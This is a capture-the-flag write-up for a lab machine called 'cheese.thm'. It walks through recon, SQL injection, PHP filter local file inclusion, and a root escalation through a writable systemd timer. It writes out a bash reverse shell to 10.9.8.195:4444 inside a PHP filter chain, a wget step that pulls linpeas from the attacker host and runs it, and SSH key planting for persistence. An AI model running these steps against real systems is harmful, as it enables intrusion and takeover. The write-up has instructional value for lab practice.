NMAP
An nmap scan showed that almost every port that was scanned is open, when doing a litle research found that this machine they have done portspoofing as explaiined on

[this url from black hills](https://www.blackhillsinfosec.com/how-to-use-portspoof-cyber-deception/)

Visited the ip on a web browser and found:

![Screenshot From 2025-05-23 22-46-23](https://github.com/user-attachments/assets/1c16bfb6-d943-47d0-a1e5-3712eda2e81c)

WEB ENUM
Some of the tools that we shall use for web enumeration are
```
dirsearch #directories

vhost fuzzing # [use this](https://github.com/TeneBrae93/offensivesecurity) then navigate to the vhost script make it executable then run it:
 ```bash
./vhost-fuzzer.sh cheese.thm /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://cheese.thm 1
```
Browse the page and found a login page, tried some passwords but nothing seemed to be working

Lets try ``sqlmap`` is a tools used for detecting and exploiting SQL injection vulnerabilities in web applications.

![Screenshot From 2025-05-23 23-49-40](https://github.com/user-attachments/assets/e7fb4c57-b6c5-4fdc-8224-069f8a7913e4)

After running the command got access to the admin panel

![Screenshot From 2025-05-23 23-50-59](https://github.com/user-attachments/assets/7e82a163-a9f1-4eff-90de-3627298fed5b)

when I navigate to the message tab on the admin panel I see the url has php:filter:
![Screenshot From 2025-05-23 23-57-53](https://github.com/user-attachments/assets/975c8445-1ff4-4439-89d9-7360e11c4a19)

On the admin or message  url we can manipulate the url to /etc/passwd:

![image](https://github.com/user-attachments/assets/0587c199-8043-4af5-a624-e51910199955)

On this point want to have a reverse shell 

What I have done is that I used this command to download the payload that is going to open the reverse shell when executed

```bash
 python3 php_filter_chain_generator.py --chain "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.9.8.195/4444 0>&1'\"); ?>" | grep "^php" > payload.txt

```
this downloads a payload that I updated on the burp while setting a listener on the terminal to access the shell:

![Screenshot From 2025-05-24 12-06-05](https://github.com/user-attachments/assets/c4f7f6b7-a5c5-42a9-b85f-49640b50152f)

this is the payload 

![Screenshot From 2025-05-24 12-07-00](https://github.com/user-attachments/assets/e6e4546c-4975-47b8-882a-977cbdc21494)

Since we have the shell 

Lets download linpeas on the victim's machine
```bash
wget http://10.9.8.195:8000/linpeas.sh -O /tmp/linpeas.sh

chmod +x linpeas.sh

./llnpeas.sh
```
![Screenshot From 2025-05-24 12-20-25](https://github.com/user-attachments/assets/c1b10a5c-e4a1-4c03-9064-6f503beb4950)

shows a .ssh file of the comte user it has authorized_keys file and this contains the ssh keys of authorized users who can establish an SSH connection as user comte on the target.

lets generate the ssh key
```bash
ssh-keygen -t rsa
```
![Screenshot From 2025-05-24 12-29-18](https://github.com/user-attachments/assets/f5e78564-fac4-4d93-99ae-9ac0a8b76882)

Copy the public ssh key from id_rsa.pub file

![Screenshot From 2025-05-24 12-28-00](https://github.com/user-attachments/assets/21d17520-61ca-4457-b9c3-4ddec485031e)

Paste the key on the authorizad_keys file

![Screenshot From 2025-05-24 13-47-16](https://github.com/user-attachments/assets/cd57844d-7b49-409b-aab9-94dc31330f27)

Lets login using comte ``ssh -i id_rsa comte@10.10.108.215`` on the terminal of your machine

![Screenshot From 2025-05-24 13-48-52](https://github.com/user-attachments/assets/d26a2cb4-640b-4d14-b690-2c563b6a20c5)

then access the user.txt file using ``cat user.txt``

PRIVELAGE ESCALATION 

lets see the commands that have root access by ``sudo -l``

![Screenshot From 2025-05-24 13-51-28](https://github.com/user-attachments/assets/ca4bf30a-18d2-4ae8-bd5d-2bb95a993efb)

Lets navigate to the directory where services are stored ``/etc/systemd/system``

can checked the exploit.timer file using cat

I also had writable permission. I pasted the whole script on ChatGPT and told it the whole context then I got to know that i have to change the value of OnBootSec variable so I did that and changed the value to 5s

![image](https://github.com/user-attachments/assets/c5cf728f-0adb-4b30-abc7-bb6efd792c96)

used nano to edit exploit.timer

to a 5second on bootsec

Then run this commands 
```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart exploit.timer
 cd /opt
```

![Screenshot From 2025-05-24 13-58-44](https://github.com/user-attachments/assets/d82fccf0-7785-49f8-9ccb-64d191da3f76)

Did research on what is `xxd` and found:

The xxd command is a hex dump utility for Linux/Unix systems. It can create a hex dump of a file or convert a hex dump back into binary.

 What xxd Does:

Hex Dump: Converts binary data into a readable hexadecimal + ASCII format.

Reverse Hex: Converts hex dump back to the original binary data.

used this to get the root.txt flag














